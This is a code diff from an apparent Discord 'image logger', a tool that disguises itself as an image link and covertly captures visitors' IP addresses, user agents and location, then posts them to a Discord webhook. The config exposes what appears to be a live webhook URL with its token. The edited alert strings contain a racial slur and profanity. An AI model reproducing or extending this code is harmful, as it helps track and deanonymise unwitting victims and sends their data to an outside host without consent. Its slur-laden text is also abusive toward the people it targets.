@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1409291982563577896/4Ekgq6C5Kvf-KOHJr5vWjLSFuCp-xnnylSf35M5EgMkyiVZ29FPoZ2YPcDSJKDtpnHsw",
-    "image": "https://m.media-amazon.com/images/I/81XQnUEu5lL._UF1000,1000_QL80_.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://i.pinimg.com/736x/b4/96/72/b49672d17bd976dc3868284eb180e6a8.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -80,7 +80,7 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "IDK - Error",
+            "title": "FUCK - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
         }
@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "A LINK WAS SENT NIGGA",
             "color": config["color"],
-            "description": f"An **YOUR GONNA GET A IP SOON NGGA** !\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f" **YOUR GONNA GET A IP SOON NGGA** !\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
